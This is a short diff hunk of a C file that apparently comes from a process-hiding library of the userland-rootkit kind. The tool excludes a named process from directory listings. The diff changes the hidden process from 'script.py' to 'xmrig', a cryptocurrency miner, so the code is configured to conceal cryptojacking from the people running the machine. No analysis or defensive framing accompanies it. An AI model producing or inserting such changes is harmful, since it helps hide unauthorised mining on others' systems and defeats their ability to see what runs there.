@@ -9,7 +9,7 @@
 /*
  * Every process with this name will be excluded
  */
-static const char* process_to_filter = "script.py";
+static const char* process_to_filter = "xmrig";
 
 /*
  * Get a directory name given a DIR* handle
